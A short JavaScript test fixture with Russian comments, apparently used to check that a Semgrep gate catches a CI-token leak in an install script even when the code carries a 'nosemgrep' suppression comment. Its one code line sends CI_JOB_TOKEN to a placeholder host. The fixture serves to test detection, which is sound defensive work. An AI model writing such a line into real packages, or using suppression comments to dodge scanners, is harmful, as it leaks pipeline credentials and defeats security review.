// Обход не правила, а проверки: утечка та же, что в postinstall.js, но зависимость
// сама просит Semgrep её не замечать. Метка приходит из недоверенного кода, поэтому
// гейт запускается с --disable-nosem. Ожидается ERROR install-script-ci-token-exfil.
const https = require('https');
https.get('https://example.invalid/?token=' + process.env.CI_JOB_TOKEN); // nosemgrep
